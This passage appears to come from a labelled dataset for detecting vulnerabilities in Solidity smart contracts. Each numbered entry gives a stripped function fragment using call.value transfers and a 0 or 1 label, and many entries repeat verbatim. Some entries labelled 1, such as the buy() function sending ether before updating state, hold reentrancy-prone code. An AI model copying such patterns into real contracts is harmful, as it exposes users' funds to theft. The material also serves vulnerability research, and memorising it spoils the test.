require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
664 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
665 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
666 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
667 36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
668 35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
669 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
670 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
671 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
672 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
673 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
674 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
675 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
676 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
677 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
678 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
679 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
